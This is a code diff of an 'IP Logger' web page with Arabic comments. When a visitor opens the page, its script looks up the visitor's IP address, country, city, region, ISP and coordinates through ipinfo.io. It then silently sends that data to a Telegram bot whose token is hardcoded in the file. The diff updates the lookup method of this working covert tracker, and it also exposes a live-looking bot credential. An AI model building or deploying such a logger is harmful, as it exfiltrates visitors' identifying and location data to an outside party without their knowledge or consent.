@@ -3,7 +3,6 @@
 <head>
     <title>IP Logger</title>
     <script>
-        // التوكن الجديد
         const botToken = '8785733862:AAEMVzY_90ifztd1S3A3IIBT_KMB_ryAgn0';
 
         async function sendInfo() {
@@ -16,28 +15,18 @@
                     return;
                 }
 
-                // جلب الـ IP الحقيقي
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                // جلب الموقع الحقيقي
-                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
-                const locationData = await locationResponse.json();
-
-                if (locationData.status !== 'success') {
-                    document.body.innerHTML = '<h1>❌ فشل جلب الموقع</h1>';
-                    return;
-                }
+                // استخدام ipinfo.io (مجاني وما يطلب مفتاح)
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
 
                 const message = `
 🕵️ **تم تسجيل دخول جديد!**
-📌 **IP:** ${ip}
-📍 **الدولة:** ${locationData.country || 'غير معروف'}
-🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
-🗺️ **المنطقة:** ${locationData.regionName || 'غير معروف'}
-🌐 **المزود:** ${locationData.isp || 'غير معروف'}
-📡 **المنظمة:** ${locationData.org || 'غير معروف'}
+📌 **IP:** ${data.ip || 'غير معروف'}
+📍 **الدولة:** ${data.country || 'غير معروف'}
+🏙️ **المدينة:** ${data.city || 'غير معروف'}
+🗺️ **المنطقة:** ${data.region || 'غير معروف'}
+🌐 **المزود:** ${data.org || 'غير معروف'}
+📍 **الموقع:** ${data.loc || 'غير معروف'}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
